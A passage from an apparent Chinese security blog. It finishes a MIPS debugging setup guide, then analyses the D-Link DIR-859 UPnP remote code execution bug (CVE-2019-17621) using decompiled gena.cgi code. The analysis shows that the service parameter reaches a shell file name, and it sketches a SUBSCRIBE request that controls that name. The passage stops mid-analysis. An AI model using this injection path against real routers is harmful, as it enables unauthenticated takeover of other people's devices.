#cd gdb-8.1
#./configure --target=mips-linux --prefix=/usr/local/mipes-gdb –v
（--target配置gdb的目标平台，--prefix配置安装路径，当然其他路径也可以，.跟下面配置一致即可，须在环境变量中声明，为直接在命令行启动mips-linux-gdb需要，可更改/etc/profile或~/.bash_profile或~/.bashrc，添加export PATH=$PATH:/usr/local/mips-gdb/bin，这样可以找到路径）
#make
#make install
（生成mips-linux-gdb,并存入/usr/local/mips-gdb/bin/，查询确认下）
也可以启动mips-linux-gdb，若成功，则证明安装无误
进入gdb/gdbserver目录：
# pwd
xx/gdb-8.1/gdb/gdbserver
#必须在gdbserver目录下运行配置命令，此时才能用相对路径
#./configure --target=mips-linux --host=mips-linux
（--target=mips-linux表示目标平台，--host表示主机端运行的是mips-linux-gdb，不需要配置—prefix，因为gdbserver不在主机端安装运行）
#make CC=/usr/local/mips/2.95.3/bin/mips-linux-gcc
(这一步要指定你自己的mips-linux-gcc的绝对位置，我试过相对的不行，提示make:mips-linux-gcc:Command notfound，可好多人都用的相对路径，即直接赋值mips-linux-gcc，可采取make时传递参数，也可以直接修改gdbserver目录下的Makefile文件中的环境变量CC)
  使用mips-linux-strip命令处理一下gdbserver，将多余的符号信息删除，可让elf文件更精简。</code></pre>
<h1 id="调试工具gdb-multiarch、pwndbg"><a href="#调试工具gdb-multiarch、pwndbg" class="headerlink" title="调试工具gdb-multiarch、pwndbg"></a>调试工具gdb-multiarch、pwndbg</h1><p>首先是安装pwndbg，peda对于mips的动态调试没有太好的支持。pwndbg的安装命令： </p>
<pre class=" language-shell"><code class="language-shell">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh</code></pre>
<p>接着是安装<code>gdb-multiarch</code>，安装命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo apt-get install gdb-multiarch</code></pre>
<p>安装完毕后，整个远程动态调试的过程为：</p>
<ol>
<li>使用命令<code>qemu-mipsel -g 1234 -L /Your_Path/buildroot/output/target/ demo将程序运行起来，</code>-g 1234`的意思表示为监听端口1234，用于远程调试。</li>
<li>使用<code>gdb-multiarch ./demo</code>来开启gdb。</li>
<li>进入gdb后，使用命令<code>target remote 127.0.0.1:1234</code>，即开始调试程序。</li>
</ol>
<p>用gdb-multiarch调试，相较于ida远程调试来说，对于用习惯了gdb调试的人来说应该会方便不少，而且还有pwndbg的支持。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://xz.aliyun.com/t/3826" target="_blank" rel="noopener">https://xz.aliyun.com/t/3826</a> </p>
<p> <a href="https://xz.aliyun.com/t/462" target="_blank" rel="noopener">https://xz.aliyun.com/t/462</a> </p>
<p><a href="[https://www.vulbox.com/knowledge/detail/?id=35%20%20](https://www.vulbox.com/knowledge/detail/?id=35">路由器固件安全分析技术（一）</a> )</p>
<p><a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">路由器破解初探之环境搭建</a></p>
]]></content>
      <categories>
        <category>iot</category>
      </categories>
  </entry>
  <entry>
    <title>D-Link RCE CVE-2019-17621分析</title>
    <url>/2020/03/29/d-link-rce-cve-2019-17621-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p> The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network. </p>
</blockquote>
<p>这是CVE官网对于CVE-2019-17621的描述，从描述中可以看出漏洞出现在处理UPnP订阅请求的代码中，漏洞目标是D-Link DIR-859路由器，固件版本为1.06b01 Beta01, 1.05，该漏洞是无需认证的远程代码执行漏洞（一般处于局域网中）。</p>
<p>根据研究人员Miguel Mendez Z.的介绍，该漏洞还影响以下产品：</p>
<p><img src="Affected_product.png" alt=""></p>
<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><table>
<thead>
<tr>
<th></th>
<th>测试环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Ubuntu 16.04 LTS</td>
<td></td>
</tr>
<tr>
<td>系统仿真工具</td>
<td>Firmadyne</td>
<td></td>
</tr>
<tr>
<td>反编译工具</td>
<td>Ghidra</td>
<td></td>
</tr>
<tr>
<td>分析固件</td>
<td>DIR-859 1.05版本</td>
<td><a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip">ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip</a></td>
</tr>
</tbody></table>
<p>Firmadyne是一款自动化和可裁剪的嵌入式Linux系统固件分析框架，它支持系统固件逆向QEMU嵌入式系统模拟执行，使用其可模拟执行路由器固件，安装和使用方法详见<a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a>。之后的文章会可能会对该工具进一步介绍。</p>
<p>Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。 Ghidra具有反编译功能，查看、定位反编译后的代码相较于IDA有优势。 针对MIPS架构代码的反编译功能较好。</p>
<h1 id="upnp"><a href="#upnp" class="headerlink" title="upnp"></a>upnp</h1><p>该漏洞设计upnp，那么简单了解下upnp协议。</p>
<p>随着越来越多的设备联入网络，对于共享设备以及共享设备提供的资源和服务的需求也越来越强烈，透明的访问各种联入网络的资源也成为了一种非常复杂的任务。因此，在1999年，Microsoft公司开始大张旗鼓地宣传下一代即插即用技术–通用即插即用（ Universal Plug and Play，简称UPnP）。UPnP实际上是扩展了传统单机的设备和计算机系统的概念，在”零配置”的前提下提供了连网设备之间的发现、接口声明和其他信息的交换等互动操作功能。Microsoft公司称”UPnP将延伸到家庭中的每一个设备，它会成为个人电脑、应用程序、智能设备集成工作所必需的框架、协议和接口标准”。</p>
<p>UPnP是实现智能设备端到端网络连接的结构。它也是一种架构在TCP/IP和HTTP技术之上的，分布式、开放的网络结构，以使得在联网的设备间传递控制和数据。UPnP 技术实现了 控制点、设备和 服务之间通讯的支持，并且设备和相关服务的也使用XML定义并且公布出来。使用UPnP，设备可以动态加入网络，自动获得一个IP地址，向其他设备公布它的能力或者获知其他设备的存在和服务，所有这些过程都是自动完成的，此后设备能够彼此直接通讯。 </p>
<p>UPnP不需要设备驱动程序，因此使用UPnP建立的网络是介质无关的。同时UPnP使用标准的TCP/IP和网络协议，使它能够无缝的融入现有网络。构造UPnP应用程序时可以使用任何语言，并在任何操作系统平台上编译运行。对于设备的描述，使用HTML表单表述设备控制界面。它既允许设备供应商提供基于浏览器的用户界面和编程控制接口，也允许开发人员定制自己的设备界面。 </p>
<p>由于该漏洞主要涉及到upnp订阅请求处理函数，订阅事件定义在gena协议中，下面介绍下upnp网络中的设备事件。</p>
<h2 id="设备事件"><a href="#设备事件" class="headerlink" title="设备事件"></a>设备事件</h2><p>设备事件是UPnP网络的第四步。一个服务的UPnP描述包括服务响应的动作列表和运行时模拟服务状态的变量列表。当这些变量改变时，服务就会发布更新，则控制点就会收到设备事件。设备事件发送的一般过程如下图： </p>
<p><img src="event.png" alt=""></p>
<p>为了订阅事件，订阅者发送一个订阅消息。如果出版者收到此消息，它将以这个订阅的持续时间作为响应。为了保持订阅，订阅者必须在订阅到期之前进行续订。在订阅者不需要出版者发送的事件时，订阅者必须取消这个订阅。出版者通过发送事件消息提醒订阅者状态变量改变。事件消息包含多个状态变量的名字和这些变量的当前值。在订阅者第一次订阅时，需要发送初始化事件消息，这个事件包含所有事件变量的名和值并且允许订阅者出示化服务变量值。为了支持多个控制点，在动作生效之后所有订阅者都将接到通知。事件消息使用HTTP协议传送，事件详细定义在通用事件通知结构（General Event Notification Architecture）协议中。 </p>
<p>关于upnp的具体实现细节不在这里叙述啦。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>利用binwalk能够直接解压固件，先在文件系统中查找是否有gena.cgi的文件</p>
<p><code>find . -name "gena.cgi"</code></p>
<p>或包含gena.cgi的文件</p>
<p><code>grep -nr "gena.cgi" .</code></p>
<p><img src="grep_gena.cgi.png" alt=""></p>
<p>定位到/htdocs/cgibin，利用Ghidra直接反编译，其中<code>main()</code>函数比较最后一个’/‘之后的参数是否等于gena.cgi。</p>
<p><img src="main().png" alt=""></p>
<p>之后跳转到<code>genacgi_main()</code>函数.</p>
<p><img src="genacgi_main.png" alt=""></p>
<p>该函数在处理UPnP订阅请求过程中，存在远程执行代码漏洞，Ghidra反编译得到<code>genacgi_main()</code>的伪码。（为了方便阅读，对变量进行更名）</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">genacgi_main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_method <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  request_uri <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request_uri_0x3f <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>request_uri_0x3f<span class="token punctuation">,</span><span class="token string">"?service="</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span>
  <span class="token comment" spellcheck="true">/* 如果不是SUBSCRIBE */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>request_method<span class="token punctuation">,</span><span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token punctuation">}</span>
  request_method <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"SERVER_ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_sid <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_SID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_callback <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_CALLBACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_timeout <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_TIMEOUT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  http_nt <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_NT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  remote_addr <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     cmp_service <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>http_nt<span class="token punctuation">,</span><span class="token string">"upnp:event"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_callback <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-infinite"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       real_timeout <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          cmp_service <span class="token operator">=</span> <span class="token function">strncasecmp</span><span class="token punctuation">(</span>http_timeout<span class="token punctuation">,</span><span class="token string">"Second-"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          request_uri <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_004103d8<span class="token punctuation">;</span>
          real_timeout <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>http_timeout <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       sVar1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_callback<span class="token punctuation">[</span>sVar1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       http_callback <span class="token operator">=</span> http_callback <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>http_callback <span class="token operator">==</span> <span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       cmp_service <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>http_callback<span class="token punctuation">,</span><span class="token string">"http://"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp_service <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          http_sid <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_sid <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token operator">*</span>http_sid <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 漏洞点 */</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">/* 处理buf */</span>
            <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pid <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"NOTIFY:0:sh %s/%s_%d.sh"</span><span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">xmldbc_timer</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          request_uri <span class="token operator">=</span> <span class="token number">0x19c</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p><code>genacgi_main()</code>首先进行一系列判断和取值，其中包括判断<code>REQUEST_METHOD</code>是否为<code>SUBSCRIBE</code>，只有当请求方式为<code>SUBSCRIBE</code>才能触发漏洞，还判断了<code>REQUEST_URI</code>中是否有<code>?service=</code>参数，并将<code>?service=</code>之后的值赋给变量<code>request_uri_0x3f</code>，通过<code>getpid()</code>获得当前的<code>pid()</code>。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>漏洞点位于<code>sprintf()</code>中，<code>sprintf()</code>设置了一个缓冲区buf，将之前取得一些列的值都放到缓冲区buf中，其中我们需要关注的是<code>SHELL_FILE=%s/%s_%d.sh</code>。经过sprintf()之后，缓冲区中有<code>SHELL_FILE=/var/run/request_uri_0x3f_pid.sh</code>，其中<code>request_uri_0x3f</code>上面提到是<code>?service=</code>之后的值。</p>
<p>也就是说如果我们构造如下结构的数据包将可以控制缓冲区中<code>SHELL_FILE</code>的值。</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">REQUEST_METHOD</span> <span class="token operator">=</span> <span class="token constant">SUBSCRIBE</span>
<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
request_uri_0x3f <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 0x3f = </span><span class="token string">'?'</span>
request_uri_0x3f <span class="token operator">=</span> request_uri_0x3f <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#此时request_uri_0x3f = file_name</span></code></pre>
<p>之后缓冲区的buf被<code>xmldbc_ephp()</code>处理。<code>xmldbc_ephp()</code>函数的第三个参数为buf，进入该函数。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">xmldbc_ephp</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>undefined4 param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>undefined4 param_4<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  size_t <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>local_20<span class="token punctuation">;</span>

  local_20 <span class="token operator">=</span> <span class="token operator">&amp;</span>_gp<span class="token punctuation">;</span>
  <span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token function">lenof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>param_4<span class="token punctuation">,</span>local_20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现获取了buf的长度之后，<code>FUN_0041420c()</code>处理了buf（第四个参数），继续进入该函数。</p>
<pre class=" language-c"><code class="language-c">undefined4
<span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>uint param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span>undefined4 buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">,</span>
               <span class="token keyword">int</span> param_6<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* 创建socket */</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> __fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar1 <span class="token operator">=</span> <span class="token function">FUN_00413810</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span>param_3<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>首先<code>FUN_0041372c()</code>创建socket</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>
  sockaddr local_80 <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
     <span class="token function">fcntl</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       param_1 <span class="token operator">=</span> <span class="token string">"/var/run/xmldb_sock"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_family <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token function">snprintf</span><span class="token punctuation">(</span>local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_data<span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar1 <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>local_80<span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar2 <span class="token operator">=</span> __fd<span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
       <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>之后当_fd &gt; -1时，buf被传入FUN_00413810()中，作为第四个参数，进入该函数。</p>
